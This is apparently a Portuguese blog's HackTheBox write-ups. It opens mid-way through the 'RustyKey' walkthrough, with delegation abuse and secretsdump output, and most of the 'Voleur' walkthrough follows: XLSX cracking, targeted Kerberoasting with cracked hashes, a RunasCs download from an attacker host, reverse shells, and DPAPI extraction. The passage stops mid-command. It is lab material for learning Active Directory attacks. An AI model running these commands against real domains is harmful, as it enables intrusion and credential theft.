\u0026#39;it-computer3$\u0026#39; PS C:\\Windows\u0026gt; Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount DistinguishedName : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb DNSHostName : dc.rustykey.htb Enabled : True Name : DC ObjectClass : computer ObjectGUID : dee94947-219e-4b13-9d41-543a4085431c PrincipalsAllowedToDelegateToAccount : {CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb} \u0026lt;-- Permissão setada com sucesso SamAccountName : DC$ SID : S-1-5-21-3316070415-896458127-4139322052-1000 UserPrincipalName : Aqui colocamos a permissão no DC pois irá nos permitir impersonar qualquer usuário do AD. Após isso é só solicitar um TGS impersonando o BackupAdmin e rodar o DCSync. Para solicitar o TGS estarei usando o getST.py do Impacket:\ngetST.py -spn CIFS/dc.rustykey.htb -impersonate BackupAdmin -dc-ip \u0026#34;dc.rustykey.htb\u0026#34; \u0026#34;rustykey.htb\u0026#34;/\u0026#39;it-computer3$\u0026#39;:\u0026#39;Rusty88!\u0026#39; Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies [-] CCache file is not found. Skipping... [*] Getting TGT for user [*] Impersonating BackupAdmin [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in BackupAdmin@CIFS_dc.rustykey.htb@RUSTYKEY.HTB.ccache E para dumpar as hashs do dominio, estarei usando o secretsDump.py que também é do Impacket:\nKRB5CCNAME=BackupAdmin@CIFS_dc.rustykey.htb@RUSTYKEY.HTB.ccache secretsdump -k \u0026#34;dc.rustykey.htb\u0026#34; [*] Service RemoteRegistry is in stopped state [*] Starting service RemoteRegistry [*] Target system bootKey: 0x94660760272ba2c07b13992b57b432d4 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3aac437da6f5ae94b01a6e5347dd920::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [*] Dumping cached domain logon information (domain/username:hash) [*] Dumping LSA Secrets [*] $MACHINE.ACC RUSTYKEY\\DC$:plain_password_hex:0c7fbe96b20b5afd1da58a1d71a2dbd6ac75b42a93de3c18e4b7d448316ca40c74268fb0d2281f46aef4eba9cd553bbef21896b316407ae45ef212b185b299536547a7bd796da250124a6bb3064ae4 8ad3a3a74bc5f4d8fbfb77503eea0025b3194af0e290b16c0b52ca4fecbf9cfae6a60b24a4433c16b9b6786a9d212c7aaefefa417fe33cc7f4dcbe354af5ce95f407220bada9b4d841a3aa7c6231de9a9ca46a0621040dc384043e19800093 303e1485021289d8719dd426d164e90ee3db3914e3d378cc9e80560f20dcb64b488aa468c1b71c2bac3addb4a4d55231d667ca4ba2ad36640985d9b18128f7755b25 RUSTYKEY\\DC$:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790::: [*] DefaultPassword RUSTYKEY\\Administrator:Rustyrc4key#! ... O secretsDump nos retornou a senha do Administrator, então não precisamos utilizar a hash. E para finalizar a máquina, só falta solicitar o TGT do Administrator e pegar a flag root:\n\u0026gt;export KRB5CCNAME=Administrator.ccache \u0026gt;evil-winrm -r RUSTYKEY.HTB -i dc.rustykey.htb Evil-WinRM shell v3.7 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; ","date":"8 novembro 2025","externalUrl":null,"permalink":"/CatOverflow/writeups/rustykey-htb/","section":"Writeups","summary":"As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A","title":"RustyKey - HTB","type":"writeups"},{"content":"","date":"8 novembro 2025","externalUrl":null,"permalink":"/CatOverflow/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"8 novembro 2025","externalUrl":null,"permalink":"/CatOverflow/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"","date":"30 outubro 2025","externalUrl":null,"permalink":"/CatOverflow/tags/medium/","section":"Tags","summary":"","title":"Medium","type":"tags"},{"content":" Resumo # A Voleur é uma máquina de nível Medium focada em Windows/Active Directory (AD). É uma máquina divertida pois ela possui diversos passos interessantes de se explorar. Iniciamos com um usuário que nos permite acessar uma share do SMB que contém um arquivo com senha que contém credenciais de duas contas de serviços no AD. Com uma dessas contas conseguimos realizar um ataque de Kerberoasting e acesso a outra conta de serviço. Outra conta de serviço obtida anteriormente permite nós restaurarmos um usuário deletado que contém um DPAPI com dados salvos. Dentro desse DPAPI conseguimos credenciais de outro usuário que leva a uma chave SSH, e por fim, conseguimos realizar um Secretsdump para obter a hash do Administrator.\nUser Flag # Recon Inicial # Brutando o arquivo XLSX e obtendo a senha do SVC_LDAP e SVC_IIS # Como descrito na descrição da box, ja iniciamos com um usuário e senha: ryan.naylor:HollowOct31Nyt, usaremos ele para iniciar o recon e entender o que temos de disponivel para utilizar.\nComo sempre, estarei utilizando o Rustscan pra realizar a enumeração inicial com o objetivo de encontrar portas abertas e o nome do AD/DOMAIN:\n\u0026gt; rustscan -a 10.129.102.81 -u 5000 -- -sV Nmap scan report for 10.10.11.76 Host is up, received echo-reply ttl 127 (0.15s latency). Scanned at 2025-07-05 16:10:05 -03 for 58s PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-06 03:10:12Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 2222/tcp open ssh syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 49664/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49668/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 52560/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 62338/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 62339/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 62341/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 62364/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel SEMPRE que rodar o Rustscan/Nmap, adicione o domain encontrado no seu arquivo /etc/hosts para não ter problemas de DNS. E SEMPRE que for possível, coloque o dc.DOMINIO.htb ANTES do DOMINIO.htb. Encontramos várias portas padrões de máquinas Windows, apenas uma chamou a minha atenção: a porta 2222 que está rodando um SSH, porém não temos como fazer nada por hora, então prosseguimos com a enumeração do AD usando o nosso usuário.\nAo tentar logar no SMB usando as credenciais disponibilizadas, descobrimos que a autenticação com NTLM está desativada, então para essa máquina precisaremos utilizar somente TGT/TGS para conseguir se autenticar no Kerberos:\n\u0026gt; nxc smb voleur.htb -u \u0026#39;ryan.naylor\u0026#39; -p \u0026#39;HollowOct31Nyt\u0026#39; SMB 10.129.102.81 445 10.129.102.81 [*] x64 (name:10.129.102.81) (domain:10.129.102.81) (signing:True) (SMBv1:False) (NTLM:False) SMB 10.129.102.81 445 10.129.102.81 [-] 10.129.102.81\\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED Para utilizar o Kerberos pelo Linux, precisaremos configurar o /etc/krb5.conf e o /etc/hosts:\n#/etc/krb5.conf [realms] VOLEUR.HTB = { kdc = dc.voleur.htb } #/etc/hosts 10.129.102.81 dc.voleur.htb voleur.htb Sempre que precisarmos utilizar o Kerberos em uma máquina, NUNCA utilize o endereço IP da máquina, o Kerberos só trabalha utilizando DNS, ou seja, ao invés de usar 10.129.102.81, sempre utilizaremos dc.voleur.htb ou voleur.htb, fica a dica. Com isso configurado, ao tentarmos solicitar o ticket com getTGT.py do Impacket, recebemos o erro de Clock skew:\n\u0026gt; getTGT.py voleur.htb/ryan.naylor:\u0026#39;HollowOct31Nyt\u0026#39; Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) Esse erro sempre acontece quando o horário da sua máquina está diferente do horário do Kerberos. Tem várias maneiras de corrigir isso, no meu caso estarei usando o Faketime:\n\u0026gt; faketime \u0026#34;$(rdate -n voleur.htb -p | awk \u0026#39;{print $2, $3, $4}\u0026#39; | date -f - \u0026#34;+%Y-%m-%d %H:%M:%S\u0026#34;)\u0026#34; zsh O faketime irá abrir uma shell nova com o horário sincronizado com o horário do AD, com isso conseguimos se autenticar normalmente. Podemos agora solicitar o ticket com o getTGT.py:\n\u0026gt; getTGT.py -dc-ip \u0026#34;dc.voleur.htb\u0026#34; voleur.htb/ryan.naylor:\u0026#39;HollowOct31Nyt\u0026#39; Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in ryan.naylor.ccache Irei usar também o kinit para solicitar um TGT completo por via das duvidas:\n\u0026gt; kinit ryan.naylor@VOLEUR.HTB Password for ryan.naylor@VOLEUR.HTB: \u0026gt; klist Ticket cache: FILE:ryan.naylor.ccache Default principal: ryan.naylor@VOLEUR.HTB Valid starting Expires Service principal 07/09/2025 02:02:44 07/09/2025 12:02:44 krbtgt/VOLEUR.HTB@VOLEUR.HTB renew until 07/10/2025 02:02:40 Com o ticket do RYAN.NAYLOR, podemos enumerar as shares utilizando o Netexec:\n\u0026gt; KRB5CCNAME=ryan.naylor.ccache nxc smb dc.voleur.htb -k -u ryan.naylor -p \u0026#39;HollowOct31Nyt\u0026#39; --shares SMB dc.voleur.htb 445 dc [*] x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) SMB dc.voleur.htb 445 dc [+] voleur.htb\\ryan.naylor:HollowOct31Nyt SMB dc.voleur.htb 445 dc [*] Enumerated shares SMB dc.voleur.htb 445 dc Share Permissions Remark SMB dc.voleur.htb 445 dc ----- ----------- ------ SMB dc.voleur.htb 445 dc ADMIN$ Remote Admin SMB dc.voleur.htb 445 dc C$ Default share SMB dc.voleur.htb 445 dc Finance SMB dc.voleur.htb 445 dc HR SMB dc.voleur.htb 445 dc IPC$ READ Remote IPC SMB dc.voleur.htb 445 dc IT READ SMB dc.voleur.htb 445 dc NETLOGON READ Logon server share SMB dc.voleur.htb 445 dc SYSVOL READ Logon server share Aqui nos deparamos com uma share interessante, a IT. Podemos entrar nela e ver que tipo de arquivo ela compartilha. Para isso podemos usar o smbclient:\n\u0026gt; smbclient //dc.voleur.htb/IT --use-kerberos=required --use-krb5-ccache=/workspace/ryan.naylor.ccache ... smb: \\First-Line Support\\\u0026gt; ls . D 0 Wed Jan 29 06:40:17 2025 .. D 0 Wed Jan 29 06:10:01 2025 Access_Review.xlsx A 16896 Thu Jan 30 11:14:25 2025 5311743 blocks of size 4096. 893859 blocks available smb: \\First-Line Support\\\u0026gt; get Access_Review.xlsx getting file \\First-Line Support\\Access_Review.xlsx of size 16896 as Access_Review.xlsx (28.1 KiloBytes/sec) (average 28.1 KiloBytes/sec) Dentro da share IT encontramos um arquivo xlsx, baixando ele e tentando abrir, descobrimos que ele possui senha:\nPodemos tentar um ataque de força bruta nesse arquivo, para isso irei usar o office2john e a wordlist rockyou:\n\u0026gt; office2john.py Access_Review.xlsx \u0026gt; hash \u0026gt; john --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 SSE2 4x / SHA512 128/128 SSE2 2x AES]) Cost 1 (MS Office version) is 2013 for all loaded hashes Cost 2 (iteration count) is 100000 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, \u0026#39;h\u0026#39; for help, almost any other key for status football1 (Access_Review.xlsx) 1g 0:00:00:07 DONE (2025-07-09 02:14) 0.1318g/s 103.3p/s 103.3c/s 103.3C/s football1..lolita Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Abrindo o arquivo xlsx, encontramos as seguintes informações:\nAqui temos algumas informações valiosas, que são:\nExistia um usuário chamado TODD.WOLFE que foi DELETADO, e sua senha é NightT1meP1dg3on14; O usuário LACEY.MILLER e o TODD.WOLFE tem acesso nível Second-Line Support Technician; JEREMY.COMBS tem acesso nível Third-Line Support Technician; SVC_LDAP tem a senha M1XyC9pW7qT5Vn; SVC_IIS tem a senha N5pXyW1VqM7CZ8; A senha do SVC_BACKUP está com o JEREMY.COMBS. Utilizando de um Kerberoasting para obter o SVC_WINRM # Com essas informações, podemos ir para o bloodhound. Irei utilizar o bloodhound-python para scannear o AD e gerar um zip para digerir no bloodhound-legacy:\nKRB5CCNAME=ryan.naylor.ccache bloodhound-python -k -u ryan.naylor -p \u0026#39;HollowOct31Nyt\u0026#39; -d voleur.htb -ns 10.129.102.81 -c ALL --zip INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3) INFO: Found AD domain: voleur.htb INFO: Using TGT from cache INFO: Found TGT with correct principal in ccache file. INFO: Connecting to LDAP server: dc.voleur.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: dc.voleur.htb INFO: Found 12 users INFO: Found 56 groups INFO: Found 2 gpos INFO: Found 5 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: DC.voleur.htb INFO: Done in 00M 29S INFO: Compressing output into 20250709012536_bloodhound.zip Olhando as permissões do RYAN.NAYLOR, não encontramos nada útil:\nPorém como vimos anteriormente, nós temos as senhas do SVC_LDAP e do SVC_IIS:\nO SVC_IIS não tem nada interessante, porém o SVC_LDAP tem bem mais coisas interessantes. Temos a permissão WriteSPN sobre o SVC_WINRM, GenericWrite sobre a LACEY.MILLER e somos parte do grupo RESTORE_USERS.\nA permissão WriteSPN nos permite realizar um ataque de Kerberoasting. Esse ataque consiste em solicitar tickets de contas de serviço de dentro do AD para tentar quebrar a hash localmente e descobrir a senha do serviço.\nPara abusar dessa permissão, podemos usar o TargetedKerberoast.py usando o ticket do SVC_LDAP:\n\u0026gt; getTGT.py voleur.htb/**SVC_LDAP**:\u0026#39;M1XyC9pW7qT5Vn\u0026#39; \u0026gt; KRB5CCNAME=**SVC_LDAP**.ccache targetedKerberoast.py -v -d \u0026#34;voleur.htb\u0026#34; --dc-host \u0026#34;dc.voleur.htb\u0026#34; -o Kerberoastables.txt -k [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP [VERBOSE] SPN added successfully for (lacey.miller) [+] Writing hash to file for (lacey.miller) [VERBOSE] SPN removed successfully for (lacey.miller) [VERBOSE] SPN added successfully for (svc_winrm) [+] Writing hash to file for (svc_winrm) [VERBOSE] SPN removed successfully for (svc_winrm) Com isso conseguimos as hashs do SVC_WINRM e da LACEY.MILLER:\n\u0026gt; cat Kerberoastables.txt $krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$97bdc5a8f3d51ea4ed1b2cd2263d3a8d$04f633f7c3154f8f9356b16fffb2a7c874a34aa04c05ea68a00d6839cd399dc62b9e1b6075521237eeec199e149536d43f705937f3bbd0d0652cafed6f016a831daa7d7c02e94a87c197ad2d7162329aa90a1416ef01c2deac25512ec258873c15a0ec16014e33feb0d5209efdfa5196dd548ccea43b6c3bdd780de25719c79517d0b551a3f9dd95d187a61ad05c2b53b3a95b43602204f23913a99b1a4f636a494ed2c9fb3dd2fb84cebd6392c577d6fe21cc7481bfa60fad816c4bc579037a779da3d4fe21a3f5c5f1f15a640bf7b1d5be0e82c50e507d72ad2ca7bb4ead901357cecd0c7b34c93313dcdce044fdcf1c2911b30f7fbd14a6fad0cbd70643f30bdcad316d2658010de0615a43912e7f832d8bf8e6b3b51f5e46811170477c16f932414a9f526ccbab6936ff97668b6fff75cd6116be5474aa456e08d28346646bdcefc25aabf16b832f4ce943e0f71426c8e14b37d74626697fd1fe98defc41155a236476cd4a89621866a5bd113e49c9227a3fe4ce9293c4020d8bee68bf70e5e431446eb2972c76d7a93dab3af2d104493db52440a7ac5a388dc27d1f518085e95da913aa6a56917a823842c41dddce278a39054c08ef5196c811f067cce70d948a4945c1b6f477bcc86687f65c053c17e75f073b89831dd212d2f3c43e82be11cf02f2468fbcf4e55892657c67e757869bbc0fb93d0b58743a65cd545f7a736f2b308d8d88e73045006a98c62d4a00ab68946585eab2f577badf88d5e2ded59d37e1e603cbaec6c0354db4e5a563b5a2b82ea11cbc8202d107130da1f6995af8b4af4b9ea7e78511f0ac177fe7a2cf2f4af8011073a9ea852559bb68eff7559f21d700600b3b2510d3ab661437e3da8c9adb724c92c8b3ceeac8842ea2a7cd54afe68a0993f21227a658ff55fcc77e9e2c424f2cf736e70065479226372b7aea24f6ccf2646ebdb264ec643f5687bf087ccb85b5da00da1954f70ebaa88d2215caa79b5b5fb0c49f0140ccb11b311d43c54260dc1ca7a7e2ad7c497eb93e3b84b143340b940993fa376ca183eb418bad0b792ec98303942da9cf0f09d09969c36323fdfc90dca698a3df146712a5662ec8534366f2577c3e7ad9b1d9550ee37ee5fc5650dcd81950a43fb4b61ede40d5ccb2d3e24c79242b923cf8f02d05a7d0257dff1326cc2566422abc935c83ba7600d21487f56984dfb2718ff330422b0aefed46c440058e366b1f271bfa251e101b19f389f32e10fb2015652f190810b20943b1473122f82d0b8cd34e7a3481f5947090e56016fef414324b20b47c6de3b6182601c2c00c6de053dbba03c5d12c5844e9ab38568c33a0b9c08f539c845ad791fe5f68890319a31fd03a40ce74a3166a8e164b477691a43299338ffdcdecd326003ba76ff4478100b608a8186b65b9049930f032b8cd7145fab3b8788b97ae77f90e9c2fdb48ac8bd2a128daf79e7e $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$a3322ddc9b0a1a68300b287d0add2ad6$3ff323083e3a932dcf6c719b340dc14cb2a1aacef2cae416ea18a8b43bc8c9142732625afaecf8a1bc5c132358ce814455681afd982d5218b8d03d8184062677c5be828c2b15ff91d64793743737259dfa58e58cd25d0e6b86a9be5304cb485e49f69831d4b9e54dff5b3e26189efe35c0da2f13c687c2dd276171b204243302ba5cb20b33975307d3d79d7bc0a18906662b9c2cbc490521754a9166161705c2c62d867a6cd594a43c6ce040feeff0c67911904c48e103c54bf9d5c5805b222c1408a2e2ba05418625c7903872426708ba71c4cb95497d9e0e764b7b9b4e2a3939c088a890d1339b822d86f49c0f1492b55ca8c159234d301eb7b52f44e1d626fc81a848ddab2fd01eb9e56a692683be543dc871022a4d986478ef7f3b147e0770b5a83d7ae612df5438254a73767b0888c8c6907490149eec97f38f0f2993cd457fb43e1e78658acbb94c581560aedb016f6cb6deb41eb94abca1bae33af45439af1ad4262c8bc48f5fb2b4c1695522e1cace63748379eb3b7b5936877dd9e249f3d61d19c26ce13546b3619ca87a2eb4866e89f8d77906296ac3995181c15e6b15eb44107e08908faabe73d8c111494c27ce339cb07cc570d53196a9b6664fc9dc9b1ff308ce361043949ca1be60cbeb36ecbfb96a602935576bc38d129603f4ffc9bfc85dc5bef81733c90fa60c811e830c090e7b149a728c75447659e4987ea9c7435e393a19224112e4561a6011117fe33a92717fc5f1eb7b3ec324a36c2df46fbfef23a7daef77050f99ec408841ca8baa994d5615dd1f924a9cd333c0ce54d0cb4a55049feef039c783b3bad5ec130785e73da2ccce0537b9150c255d734a2da01e487a2da3837c327f6777f4872e9dceada3462a13ed2140dfbcb0b7047b879df4a0c9303896c495aae7a97f682a85c506cfcc47f402c5ac52c22dede2f620758c122c23c64d851346634b6729d185679e11fe37a0681be6a0c6b64e8d9bec15459ab1e20b7e32ea9275558e2d45027bc31d7ce0508b7df1456962ee1c7229c297e82cc0a5a3400b787e1c928030a6a9adf990f5f300cfa0f7b4cc2a931dd5e853947f0aa5dfe2fe34be989e5c2104b5482cde644c1c42bd5dbf224ebe3fd0a49221b3444e2bdc9df1688d4af2082ee02a4ac00ddd1bc7f645824695fd00f4681f87a524990bc5d4c117ef314b6f1e851f8ccacfd4ea3f614d3bc8f970c4a704ad8e15aede98541caae883139c03d59b183bd2f78ec101e27aff907df6c9257596abad53197fa9be8406f359e5d12e6f277426335a11be66606ed48e837c53511b10a1df64480b67871fb3a16150b6cd663fa408847307a987d3cd481b77df3397f9451c5e58f5fb201647a09638c4999a2a75fcc57dd785fe1923e6a072b5a397edbedc3b4dd99260b88feecd42d3e50aad2a38c78bcc444f51eb9ef55bea9a01bb2863a2d651a8defcea9cac0395 Podemos usar o hashcat ou o john para quebrar as hashs, nesse caso irei usar o john mesmo:\n\u0026gt; john --wordlist=/usr/share/wordlists/rockyou.txt Kerberoastables.txt Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS-REP etype 23 [MD4 HMAC-MD5 RC4]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, \u0026#39;h\u0026#39; for help, almost any other key for status AFireInsidedeOzarctica980219afi (?) 1g 0:00:00:12 DONE (2025-07-09 03:52) 0.07788g/s 1117Kp/s 2010Kc/s 2010KC/s !!123sabi!!123..*7¡Vamos! Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Com isso conseguimos a senha do SVC_WINRM, podemos solicitar um TGT, logar no powershell remoto e pegar a user flag:\n\u0026gt; kinit svc_winrm@VOLEUR.HTB Password for svc_winrm@VOLEUR.HTB: \u0026gt; evil-winrm -i \u0026#34;dc.voleur.htb\u0026#34; -r VOLEUR.HTB Evil-WinRM shell v3.7 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_winrm\\Documents\u0026gt; cat ../Desktop/user.txt 2782644bd5bc78c03846d47ba58b504e Root Flag # Obtendo a shell do SVC_LDAP # Voltando para o bloodhound e o arquivo xlsx que encontramos na share IT, vemos que o SVC_LDAP faz parte do grupo RESTORE_USERS, e existe um usuário chamado TODD.WOLFE deletado:\nPorém o SVC_LDAP não possui a permissão ps_remote (que permitiria logarmos usando o Evil-Winrm), só que nós temos a senha dele, então nesse caso podemos usar o RunasCs e rodar comandos na shell dele. Então com isso podemos conseguir uma reverse shell do SVC_LDAP.\nPara fazermos isso, primeiro vamos enviar o RunasCs para a máquina:\n\u0026gt; *Evil-WinRM* PS C:\\Users\\svc_winrm\\Documents\u0026gt; Invoke-WebRequest -Uri http://10.10.14.48:9090/_RunasCs.exe -Outfile runas.exe \u0026gt; *Evil-WinRM* PS C:\\Users\\svc_winrm\\Documents\u0026gt; ls Directory: C:\\Users\\svc_winrm\\Documents Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 7/9/2025 12:10 AM 53248 runas.exe Para abrir uma reverse shell, usamos o RunasCs da seguinte maneira:\n\u0026gt; *Evil-WinRM* PS C:\\Users\\svc_winrm\\Documents\u0026gt; ./runas.exe **SVC_LDAP** \u0026#39;M1XyC9pW7qT5Vn\u0026#39; powershell -r 10.10.14.48:4444 [*] Warning: The logon for user \u0026#39;**SVC_LDAP**\u0026#39; is limited. Use the flag combination --bypass-uac and --logon-type \u0026#39;8\u0026#39; to obtain a more privileged token. [+] Running in session 0 with process function CreateProcessWithLogonW() [+] Using Station\\Desktop: Service-0x0-8ae0a3$\\Default [+] Async process \u0026#39;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#39; with pid 620 created in background. E com o listener aberto, conseguimos a shell do SVC_LDAP:\n\u0026gt; rlwrap nc -lvnp 4444 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.129.102.81. Ncat: Connection from 10.129.102.81:53763. Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows PS C:\\Windows\\system32\u0026gt; Restaurando o usuário TODD.WOLFE # Como o SVC_LDAP faz parte do grupo RESTORE_USERS, podemos listar usuários no modo “tombstone” no AD. Esse modo tombstone é semelhante a uma \u0026ldquo;lixeira de usuários\u0026rdquo;, todo usuário deletado fica nesse \u0026ldquo;modo\u0026rdquo; por um certo tempo, depois ele é deletado completamente. Para listar usuários nesse modo, podemos utilizar o seguinte comando:\n\u0026gt; Get-ADObject -Filter * -IncludeDeletedObjects ... Deleted : True DistinguishedName : CN=Todd Wolfe\\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb Name : Todd Wolfe DEL:1c6b1deb-c372-4cbb-87b1-15031de169db ObjectClass : user ObjectGUID : 1c6b1deb-c372-4cbb-87b1-15031de169db ... Irá aparecer vários usuários, porém o interessante é o TODD.WOLFE. Para restaurar ele, usamos o comando:\n\u0026gt; Restore-ADObject -Identity \u0026#34;1c6b1deb-c372-4cbb-87b1-15031de169db\u0026#34; Com isso, restauramos o TODD.WOLFE. Assim como o SVC_LDAP que não tem a permissão de logar remotamente, o TODD.WOLFE também não possui. Então precisaremos utilizar novamente o RunasCs para obter uma reverse shell:\n\u0026gt; *Evil-WinRM* PS C:\\Users\\svc_winrm\\Documents\u0026gt; ./runas.exe todd.wolfe \u0026#39;NightT1meP1dg3on14\u0026#39; powershell -r 10.10.14.48:5555 [*] Warning: The logon for user \u0026#39;todd.wolfe\u0026#39; is limited. Use the flag combination --bypass-uac and --logon-type \u0026#39;8\u0026#39; to obtain a more privileged token. [+] Running in session 0 with process function CreateProcessWithLogonW() [+] Using Station\\Desktop: Service-0x0-8ae0a3$\\Default [+] Async process \u0026#39;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#39; with pid 1428 created in background. \u0026gt; rlwrap nc -lvnp 5555 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::5555 Ncat: Listening on 0.0.0.0:5555 Ncat: Connection from 10.129.102.81. Ncat: Connection from 10.129.102.81:53822. Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows PS C:\\Windows\\system32\u0026gt; Extraindo o DPAPI do TODD.WOLFE para obter a senha do JEREMY.COMBS # Com a shell do TODD.WOLFE, podemos acessar a pasta IT/Second-Line Support/Archived Users, la existe uma pasta chamada todd.wolfe, que aparenta ser um backup da pasta de usuário do TODD.WOLFE:\n\u0026gt; PS C:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\u0026gt; ls Directory: C:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe Mode LastWriteTime Length Name ---- ------------- ------ ---- d-r--- 1/29/2025 7:13 AM 3D Objects d-r--- 1/29/2025 7:13 AM Contacts d-r--- 1/30/2025 6:28 AM Desktop d-r--- 1/29/2025 7:13 AM Documents d-r--- 1/29/2025 7:13 AM Downloads d-r--- 1/29/2025 7:13 AM Favorites d-r--- 1/29/2025 7:13 AM Links d-r--- 1/29/2025 7:13 AM Music d-r--- 1/29/2025 7:13 AM Pictures d-r--- 1/29/2025 7:13 AM Saved Games d-r--- 1/29/2025 7:13 AM Searches d-r--- 1/29/2025 7:13 AM Videos Olhando as pastas, vemos que na Desktop existe um atalho do Microsoft Edge, e normalmente quanto existe um arquivo .lnk em uma máquina de CTF, significa que um browser foi utilizado por esse usuário, o que levanta suspeitas de dados salvos no DPAPI.\nSeguindo o post do The Hackers Recipe a respeito de DPAPI secrets, podemos extrair as senhas salvas utilizando o DPAPI (Data Protection API), que é um componente interno nos sistemas Windows.\nPara extrair esses dados, precisamos pegar a chave e os dados criptografados e baixar localmente. A chave fica no diretório:\nC:\\Users\\$USER\\AppData\\Roaming\\Microsoft\\Protect\\$SUID\\$GUID Nesse caso, ela fica em:\nC:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3927696377-1337352550-2781715495-1110\\08949382-134f-4c63-b93c-ce52efc0aa88 E os dados criptografados ficam em:\nC:\\Users\\$USER\\AppData\\Local\\Microsoft\\Credentials\\ C:\\Users\\$USER\\AppData\\Roaming\\Microsoft\\Credentials\\ Nesse caso:\nC:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Local\\Microsoft\\Credentials C:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Credentials Para baixar os arquivos, devemos converter em base64 e copiar. Para isso usamos os comando:\n# CHAVE \u0026gt; [Convert]::ToBase64String((Get-Content -Path \u0026#34;C:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3927696377-1337352550-2781715495-1110\\08949382-134f-4c63-b93c-ce52efc0aa88\u0026#34; -Encoding Byte -Raw)) # DADOS \u0026gt; [Convert]::ToBase64String((Get-Content -Path \u0026#34;C:\\IT\\Second-Line Support\\Archived 